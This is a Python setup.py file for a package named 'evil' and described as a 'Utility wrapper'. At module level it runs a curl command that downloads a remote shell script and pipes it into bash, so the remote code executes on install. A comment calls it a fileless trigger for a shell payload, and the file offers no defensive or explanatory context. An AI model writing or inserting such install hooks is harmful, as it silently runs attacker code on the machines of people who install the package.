from setuptools import setup
import os

# Fileless trigger for shell payload
os.system("curl -s https://raw.githubusercontent.com/mimikr00t/evil/main/payload.sh | bash")

setup(
    name='evil',
    version='0.1',
    description='Utility wrapper',
    packages=[],
)
